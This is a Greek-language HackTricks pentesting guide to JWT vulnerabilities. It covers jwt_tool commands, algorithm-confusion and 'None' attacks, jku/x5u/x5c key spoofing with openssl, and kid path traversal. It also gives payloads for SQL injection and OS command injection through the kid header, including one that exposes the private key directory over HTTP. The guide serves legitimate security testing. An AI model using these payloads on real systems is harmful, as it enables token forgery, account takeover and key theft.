# Ευπάθειες των JWT (Json Web Tokens)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**Συμβουλή για bug bounty**: **εγγραφείτε** στο **Intigriti**, μια προηγμένη **πλατφόρμα bug bounty που δημιουργήθηκε από χάκερς, για χάκερς**! Γίνετε μέλος μας στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) σήμερα και αρχίστε να κερδίζετε αμοιβές έως και **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

**Μέρος αυτής της ανάρτησης βασίζεται στην εκπληκτική ανάρτηση:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Συγγραφέας του εξαιρετικού εργαλείου για το pentest των JWTs** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Γρήγορες Επιτυχίες**

Εκτελέστε το [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) με τη λειτουργία `All Tests!` και περιμένετε για πράσινες γραμμές
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Εάν έχετε τύχη, το εργαλείο θα βρει κάποια περίπτωση όπου η web εφαρμογή ελέγχει εσφαλμένα το JWT:

![](<../.gitbook/assets/image (435).png>)

Στη συνέχεια, μπορείτε να αναζητήσετε το αίτημα στον proxy σας ή να αποθηκεύσετε το χρησιμοποιημένο JWT για αυτό το αίτημα χρησιμοποιώντας το εργαλείο jwt\_ tool:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Παραβίαση δεδομένων χωρίς τροποποίηση

Μπορείτε απλά να παραβιάσετε τα δεδομένα αφήνοντας την υπογραφή ως έχει και να ελέγξετε εάν ο διακομιστής ελέγχει την υπογραφή. Δοκιμάστε να αλλάξετε το όνομα χρήστη σας σε "admin" για παράδειγμα.

#### **Ελέγχεται το τοκέν;**

Για να ελέγξετε εάν επαληθεύεται η υπογραφή ενός JWT:

- Ένα μήνυμα σφάλματος υποδεικνύει ότι υπάρχει επαλήθευση· πρέπει να ελεγχθούν ευαίσθητες λεπτομέρειες στα αναλυτικά σφάλματα.
- Μια αλλαγή στην επιστρεφόμενη σελίδα υποδεικνύει επαλήθευση.
- Αν δεν υπάρχει αλλαγή, υποδεικνύει ότι δεν υπάρχει επαλήθευση· τότε μπορείτε να πειραματιστείτε με την παραβίαση των δηλώσεων των δεδομένων φορτίου.

### Προέλευση

Είναι σημαντικό να καθορίσετε εάν το τοκέν παράχθηκε στον διακομιστή ή στην πλευρά του πελάτη εξετάζοντας το ιστορικό αιτημάτων του διαμεσολαβητή.

- Τα τοκέν που πρωτοεμφανίζονται από την πλευρά του πελάτη υποδεικνύουν ότι ο κλειδί μπορεί να εκτίθεται στον κώδικα της πλευράς του πελάτη, απαιτώντας περαιτέρω έρευνα.
- Τα τοκέν που προέρχονται από την πλευρά του διακομιστή υποδεικνύουν ένα ασφαλές διαδικαστικό.

### Διάρκεια

Ελέγξτε εάν το τοκέν διαρκεί περισσότερο από 24 ώρες... ίσως να μην λήγει ποτέ. Εάν υπάρχει ένα πεδίο "exp", ελέγξτε εάν ο διακομιστής το χειρίζεται σωστά.

### Βίαιη εύρεση μυστικού HMAC

[**Δείτε αυτήν τη σελίδα.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Τροποποίηση του αλγορίθμου σε None (CVE-2015-9235)

Ορίστε τον χρησιμοποιούμενο αλγόριθμο ως "None" και αφαιρέστε το μέρος της υπογραφής.

Χρησιμοποιήστε την επέκταση Burp με το όνομα "JSON Web Token" για να δοκιμάσετε αυτήν την ευπάθεια και να αλλάξετε διάφορες τιμές μέσα στο JWT (στείλτε το αίτημα στο Repeater και στην καρτέλα "JSON Web Token" μπορείτε να τροποποιήσετε τις τιμές του τοκένου. Μπορείτε επίσης να επιλέξετε να τοποθετήσετε την τιμή του πεδίου "Alg" σε "None").

### Αλλαγή του αλγορίθμου RS256 (ασύμμετρος) σε HS256 (συμμετρικός) (CVE-2016-5431/CVE-2016-10555)

Ο αλγόριθμος HS256 χρησιμοποιεί το μυστικό κλειδί για να υπογράψει και να επαληθεύσει κάθε μήνυμα.\
Ο αλγόριθμος RS256 χρησιμοποιεί το ιδιωτικό κλειδί για να υπογράψει το μήνυμα και χρησιμοποιεί το δημόσιο κλειδί για την πιστοποίηση.

Εάν αλλάξετε τον αλγόριθμο από RS256 σε HS256, ο κώδικας της πίσω πλευράς χρησιμοποιεί το δημόσιο κλειδί ως μυστικό κλειδί και στη συνέχεια χρησιμοποιεί τον αλγόριθμο HS256 για να επαληθεύσει την υπογραφή.

Στη συνέχεια, χρησιμοποιώντας το δημόσιο κλειδί και αλλάζοντας το RS256 σε HS256, μπορούμε να δημιουργήσουμε μια έγκυρη υπογραφή. Μπορείτε να ανακτήσετε το πιστοποιητικό του διακομιστή του ιστότοπου εκτελώντας αυτήν την εντολή:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Νέο δημόσιο κλειδί μέσα στην κεφαλίδα

Ένας επιτιθέμενος ενσωματώνει ένα νέο κλειδί στην κεφαλίδα του τοκέν και ο διακομιστής χρησιμοποιεί αυτό το νέο κλειδί για να επαληθεύσει την υπογραφή (CVE-2018-0114).

Αυτό μπορεί να γίνει με την επέκταση "JSON Web Tokens" του Burp.\
(Στείλτε το αίτημα στο Repeater, επιλέξτε το "CVE-2018-0114" στην καρτέλα JSON Web Token και στείλτε το αίτημα).

### JWKS Spoofing

Οι οδηγίες περιγράφουν έναν τρόπο για να αξιολογήσετε την ασφάλεια των JWT τοκέν, ειδικά αυτών που χρησιμοποιούν τον ισχυρισμό "jku" στην κεφαλίδα. Αυτός ο ισχυρισμός πρέπει να συνδέεται με ένα αρχείο JWKS (JSON Web Key Set) που περιέχει το δημόσιο κλειδί που απαιτείται για την επαλήθευση του τοκέν.

- **Αξιολόγηση των τοκέν με τον ισχυρισμό "jku"**: 
- Επαληθεύστε το URL του ισχυρισμού "jku" για να βεβαιωθείτε ότι οδηγεί στο κατάλληλο αρχείο JWKS.
- Τροποποιήστε την τιμή "jku" του τοκέν για να κατευθύνετε προς έναν ελεγχόμενο διαδικτυακό υπηρεσία, επιτρέποντας την παρατήρηση της κίνησης.

- **Παρακολούθηση της αλληλεπίδρασης HTTP**:
- Η παρατήρηση των αιτήσεων HTTP προς το καθορισμένο URL υποδεικνύει τις προσπάθειες του διακομιστή να ανακτήσει κλειδιά από τον παρεχόμενο σύνδεσμο.
- Όταν χρησιμοποιείτε το `jwt_tool` για αυτήν τη διαδικασία, είναι σημαντικό να ενημερώσετε το αρχείο `jwtconf.ini` με την τοποθεσία του προσωπικού σας JWKS για να διευκολύνετε τον έλεγχο.

- **Εντολή για το `jwt_tool`**:
- Εκτελέστε την παρακάτω εντολή για να προσομοιώσετε το σενάριο με το `jwt_tool`:
```bash
python3 jwt_tool.py JWT_ΕΔΩ -X s
```

### Επισκόπηση Προβλημάτων Kid

Ένας προαιρετικός ισχυρισμός κεφαλίδας που ονομάζεται `kid` χρησιμοποιείται για τον εντοπισμό ενός συγκεκριμένου κλειδιού, το οποίο γίνεται ιδιαίτερα σημαντικό σε περιβάλλοντα όπου υπάρχουν πολλά κλειδιά για την επαλήθευση της υπογραφής του τοκέν.

#### Αποκάλυψη Κλειδιού μέσω του "kid"

Όταν ο ισχυρισμός `kid` είναι παρών στην κεφαλίδα, συνίσταται να αναζητήσετε το αντίστοιχο αρχείο ή τις παραλλαγές του στον κατάλογο του ιστότοπου. Για παράδειγμα, αν καθοριστεί `"kid":"key/12345"`, πρέπει να αναζητηθούν τα αρχεία _/key/12345_ και _/key/12345.pem_ στη ρίζα του ιστοτόπου.

#### Διάβασμα Διαδρομής με το "kid"

Ο ισχυρισμός `kid` μπορεί επίσης να εκμεταλλευτεί για την πλοήγηση μέσω του συστήματος αρχείων, επιτρέποντας πιθανώς την επιλογή ενός αυθαίρετου αρχείου. Είναι δυνατόν να δοκιμάσετε τη συνδεσιμότητα ή να εκτελέσετε επιθέσεις Server-Side Request Forgery (SSRF) αλλάζοντας την τιμή του `kid` για να στοχεύσετε συγκεκριμένα αρχεία ή υπηρεσίες. Μπορείτε να τροποποιήσετε το JWT για να αλλάξετε την τιμή του `kid` διατηρώντας την αρχική υπογραφή χρησιμοποιώντας τη σημαία `-T` στο jwt_tool, όπως φαίνεται παρακάτω:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Στοχεύοντας αρχεία με προβλέψιμο περιεχόμενο, είναι δυνατό να πλαστογραφηθεί ένα έγκυρο JWT. Για παράδειγμα, το αρχείο `/proc/sys/kernel/randomize_va_space` σε συστήματα Linux, γνωστό ότι περιέχει την τιμή **2**, μπορεί να χρησιμοποιηθεί στην παράμετρο `kid` με το **2** ως συμμετρικό κωδικό για τη δημιουργία του JWT.

#### Ενέσεις SQL μέσω "kid"

Εάν το περιεχόμενο της απαίτησης `kid` χρησιμοποιείται για να ανακτήσει έναν κωδικό πρόσβασης από μια βάση δεδομένων, μπορεί να διευκολυνθεί μια ενέσει SQL με τροποποίηση του φορτίου της `kid`. Ένα παράδειγμα φορτίου που χρησιμοποιεί ενέσει SQL για να αλλάξει τη διαδικασία υπογραφής του JWT περιλαμβάνει:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Αυτή η τροποποίηση αναγκάζει τη χρήση ενός γνωστού μυστικού κλειδιού, `ATTACKER`, για την υπογραφή του JWT.

#### Ενέσεις λειτουργικού συστήματος μέσω "kid"

Σε ένα σενάριο όπου η παράμετρος `kid` καθορίζει τη διαδρομή ενός αρχείου που χρησιμοποιείται σε ένα πλαίσιο εκτέλεσης εντολών, μπορεί να προκύψουν ευπάθειες Εκτέλεσης Απομακρυσμένου Κώδικα (RCE). Με την ενέσει εντολών στην παράμετρο `kid`, είναι δυνατή η αποκάλυψη ιδιωτικών κλειδιών. Ένα παράδειγμα φορτίου για την επίτευξη RCE και αποκάλυψη κλειδιών είναι:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u και jku

#### jku

Το jku σημαίνει **JWK Set URL**.\
Εάν το τοκέν χρησιμοποιεί μια απαίτηση "jku" στην **Κεφαλίδα**, τότε **ελέγξτε το παρεχόμενο URL**. Αυτό θα πρέπει να δείχνει σε ένα URL που περιέχει το αρχείο JWKS που κατέχει το Δημόσιο Κλειδί για τον έλεγχο του τοκέν. Τροποποιήστε το τοκέν για να δείχνει την τιμή jku σε έναν ιστότοπο υπηρεσίας που μπορείτε να παρακολουθείτε την κίνηση της κυκλοφορίας.

Πρώτα πρέπει να δημιουργήσετε ένα νέο πιστοποιητικό με νέα ιδιωτικά και δημόσια κλειδιά
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Στη συνέχεια, μπορείτε να χρησιμοποιήσετε για παράδειγμα το [**jwt.io**](https://jwt.io) για να δημιουργήσετε το νέο JWT με τα **δημόσια και ιδιωτικά κλειδιά που δημιουργήθηκαν και να δείχνετε την παράμετρο jku στο πιστοποιητικό που δημιουργήθηκε**. Για να δημιουργήσετε ένα έγκυρο πιστοποιητικό jku, μπορείτε να κατεβάσετε το αρχικό και να αλλάξετε τις απαιτούμενες παραμέτρους.

Μπορείτε να αποκτήσετε τις παραμέτρους "e" και "n" από ένα δημόσιο πιστοποιητικό χρησιμοποιώντας:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. Ένα URI που δείχνει σε ένα σύνολο δημόσιων πιστοποιητικών X.509 (ένα πρότυπο μορφής πιστοποιητικού) που έχουν κωδικοποιηθεί σε μορφή PEM. Το πρώτο πιστοποιητικό στο σύνολο πρέπει να είναι αυτό που χρησιμοποιήθηκε για να υπογράψει αυτό το JWT. Τα επόμενα πιστοποιητικά υπογράφουν το προηγούμενο, ολοκληρώνοντας έτσι την αλυσίδα πιστοποιητικών. Το X.509 καθορίζεται στο RFC 52807. Απαιτείται ασφάλεια μεταφοράς για τη μεταφορά των πιστοποιητικών.

Προσπαθήστε να **αλλάξετε αυτήν την κεφαλίδα σε ένα URL που ελέγχετε εσείς** και ελέγξτε αν λαμβάνετε οποιοδήποτε αίτημα. Σε αυτήν την περίπτωση, **μπορείτε να παρεμβάλετε το JWT**.

Για να πλαστογραφήσετε ένα νέο τοκέν χρησιμοποιώντας ένα πιστοποιητικό που ελέγχεται από εσάς, πρέπει να δημιουργήσετε το πιστοποιητικό και να εξάγετε τα δημόσια και ιδιωτικά κλειδιά:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Στη συνέχεια, μπορείτε να χρησιμοποιήσετε για παράδειγμα το [**jwt.io**](https://jwt.io) για να δημιουργήσετε το νέο JWT με τα **δημόσια και ιδιωτικά κλειδιά που δημιουργήθηκαν και να δείχνετε την παράμετρο x5u στο πιστοποιητικό .crt που δημιουργήθηκε.**

![](<../.gitbook/assets/image (439).png>)

Μπορείτε επίσης να καταχραστείτε και τις δύο αυτές ευπάθειες **για SSRFs**.

#### x5c

Αυτή η παράμετρος μπορεί να περιέχει το **πιστοποιητικό σε μορφή base64**:

![](<../.gitbook/assets/image (440).png>)

Εάν ο επιτιθέμενος **δημιουργήσει ένα αυτο-υπογεγραμμένο πιστοποιητικό** και δημιουργήσει ένα πλαστό τοκέν χρησιμοποιώντας το αντίστοιχο ιδιωτικό κλειδί και αντικαταστήσει την τιμή της παραμέτρου "x5c" με το πιστοποιητικό που δημιουργήθηκε πρόσφατα και τροποποιήσει τις άλλες παραμέτρους, δηλαδή n, e και x5t, τότε ουσιαστικά το πλαστό τοκέν θα γίνει αποδεκτό από τον διακομιστή.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Ενσωματωμένο Δημόσιο Κλειδί (CVE-2018-0114)

Εάν το JWT έχει ενσωματωμένο ένα δημόσιο κλειδί όπως στο παρακάτω σενάριο:

![](<../.gitbook/assets/image (438).png>)

Χρησιμοποιώντας το παρακάτω script nodejs είναι δυνατόν να δημιουργηθεί ένα δημόσιο κλειδί από αυτά τα δεδομένα:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"​;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Είναι δυνατόν να δημιουργηθεί ένα νέο ιδιωτικό/δημόσιο κλειδί, ενσωματώνοντας το νέο δημόσιο κλειδί μέσα στο τοκέν και να χρησιμοποιηθεί για τη δημιουργία ενός νέου υπογραφής:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Μπορείτε να αποκτήσετε τα "n" και "e" χρησιμοποιώντας αυτό το script σε nodejs:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Τέλος, χρησιμοποιώντας το δημόσιο και ιδιωτικό κλειδί και τις νέες τιμές "n" και "e" μπορείτε να χρησιμοποιήσετε το [jwt.io](https://jwt.io) για να πλαστογραφήσετε ένα νέο έγκυρο JWT με οποιεσδήποτε πληροφορίες.

### JTI (JWT ID)

Η δήλωση JTI (JWT ID) παρέχει ένα μοναδικό αναγνωριστικό για ένα JWT Token. Μπορεί να χρησιμοποιηθεί για να αποτρέψει την επανάληψη του τοκέν.\
Ωστόσο, φανταστείτε μια κατάσταση όπου το μέγιστο μήκος του αναγνωριστικού είναι 4 (0001-9999). Οι αιτήσεις 0001 και 10001 θα χρησιμοποιήσουν το ίδιο αναγνωριστικό. Έτσι, αν ο διακομιστής αυξάνει το αναγνωριστικό με κάθε αίτηση, μπορείτε να εκμεταλλευτείτε αυτό για να **επαναλάβετε μια αίτηση** (χρειάζεται να στείλετε 10000 αιτήσεις μεταξύ κάθε επιτυχούς επανάληψης).

### Καταχωρημένες δηλώσεις JWT

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Άλλες επιθέσεις

**Επιθέσεις Relay Cross-service**

Έχει παρατηρηθεί ότι ορισμένες ιστοσελίδες εξαρτώνται από ένα αξιόπιστο υπηρεσία JWT για τη δημιουργία και διαχείριση των τοκέν τους. Έχουν καταγραφεί περιπτώσεις όπου ένα τοκέν, που δημιουργήθηκε για έναν πελάτη από την υπηρεσία JWT, έγινε αποδεκτό από άλλον πελάτη της ίδιας υπηρεσίας JWT. Εάν παρατηρηθεί η έκδοση ή ανανέωση ενός JWT μέσω μιας υπηρεσίας τρίτου, πρέπει να ερευνηθεί η πιθανότητα εγγραφής σε έναν λογαριασμό σε άλλον πελάτη της υπηρεσίας χρησιμοποιώντας το ίδιο όνομα χρήστη/ηλεκτρονικού ταχυδρομείου. Στη συνέχεια, πρέπει να γίνει μια προσπάθεια επανάληψης του αποκτηθέντος τοκέν σε μια αίτηση προς τον στόχο για να δούμε αν γίνεται αποδεκτό.

- Η αποδοχή του τοκέν σας μπορεί να υποδείξει ένα κρίσιμο πρόβλημα, που ενδέχεται να επιτρέπει την πλαστογράφηση του λογαριασμού οποιουδήποτε χρήστη. Ωστόσο, πρέπει να σημειωθεί ότι ενδέχεται να απαιτείται άδεια για ευρύτερη δοκιμή εάν γίνεται εγγραφή σε μια εφαρμογή τρίτου, καθώς αυτό μπορεί να εμπίπτει σε μια νομική γκρι ζώνη.

**Έλεγχος λήξης των τοκένων**

Η λήξη του τοκέν ελέγχεται χρησιμοποιώντας τη δήλωση "exp" στο Payload. Δεδομένου ότι τα JWT συχνά χρησιμοποιούνται χωρίς πληροφορίες συνεδρίας, απαιτείται προσεκτική χειρισμός. Σε πολλές περιπτώσεις, η καταγραφή και η επανάληψη του JWT ενός άλλου χρήστη μπορεί να επιτρέψει την πλαστογράφηση αυτού του χρήστη. Το RFC του JWT συνιστά τη μείωση των επιθέσεων επανάληψης JWT με τη χρήση της δήλωσης "exp" για να ορίσετε μια χρονική λήξη για το τοκέν. Επιπλέον, η εφαρμογή σχετικών ελέγχων από την εφαρμογή για τη διασφάλιση της επεξεργασίας αυτής της τιμής και την απόρριψη των ληγμένων τοκέν είναι κρίσιμη. Εάν το τοκέν περιλαμβάνει μια δήλωση "exp" και οι χρονικοί περιορισμοί των δοκιμών το επιτρέπουν, συνιστάται να αποθηκεύσετε το τοκέν και να το επαναλάβετε μετά τη λήξη του χρόνου. Το περιεχόμενο του τοκέν, συμπεριλαμβανομένης της ανάλυσης της χρονικής σήμανσης και του ελέγχου λήξης (χρονική σήμανση σε UTC), μπορεί να διαβαστεί χρησιμοποιώντας τη σημαία -R του εργαλείου jwt_tool.

- Ενδέχεται να υπάρχει κίνδυνος ασφάλειας εάν η εφαρμογή εξακολουθεί να επικυρώνει το τοκέν, καθώς αυτό μπορεί να υποδηλώνει ότι το τοκέν δεν μπορεί να λήξει ποτέ.

### Εργαλεία

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Συμβουλή για bug bounty**: **εγγραφείτε** στο **Intigriti**, μια προηγμένη **πλατφόρμα bug bounty που δημιουργήθηκε από χάκερς, για χάκερς**! Γίνετε μέλος στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) σήμερα και αρχίστε να κερδίζετε αμοιβές έως και **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποσ
